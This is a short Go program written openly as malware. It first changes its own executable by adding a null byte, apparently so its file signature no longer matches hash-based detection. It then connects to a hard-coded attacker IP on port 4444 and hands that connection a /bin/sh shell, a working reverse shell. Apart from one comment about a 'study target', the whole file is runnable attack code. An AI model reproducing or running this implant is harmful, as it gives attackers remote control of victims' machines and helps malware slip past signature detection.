package main

import (
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	// 1. Modify the executable's signature
	modifyExecutable()

	// 2. Establish reverse shell connection
	establishReverseShell()
}

func modifyExecutable() {
	// Get current executable path
	execPath, err := os.Executable()
	if err != nil {
		log.Fatal("Failed to get executable path:", err)
	}

	// Read current executable content
	originalContent, err := os.ReadFile(execPath)
	if err != nil {
		log.Fatal("Failed to read executable:", err)
	}

	// Append null byte to change file signature
	modifiedContent := append(originalContent, byte(0))

	// Create temporary file in same directory
	tmpPath := filepath.Join(filepath.Dir(execPath), "tmpexec")

	// Create empty file with full permissions
	err = os.WriteFile(tmpPath, []byte{}, 0777)
	if err != nil {
		log.Fatal("Failed to create temp file:", err)
	}

	err = os.WriteFile(tmpPath, modifiedContent, 0777)
	if err != nil {
		log.Fatal("Failed to write modified content:", err)
	}

	// Replace original executable with modified version
	err = os.Rename(tmpPath, execPath)
	if err != nil {
		log.Fatal("Failed to replace executable:", err)
	}
}

// This connects back to the attacker's machine and provides shell access
func establishReverseShell() {
	const (
		attackerIP   = "192.168.51.126" // Replace with study target IP
		attackerPort = "4444"           // Standard reverse shell port
	)

	// Establish TCP connection to attacker
	conn, err := net.Dial("tcp", net.JoinHostPort(attackerIP, attackerPort))
	if err != nil {
		os.Exit(1)
	}
	defer conn.Close()

	// Execute system shell
	cmd := exec.Command("/bin/sh")

	// Redirect standard streams to TCP connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Run shell and maintain connection
	err = cmd.Run()
	if err != nil {
		log.Printf("Shell execution failed: %v", err)
	}
}
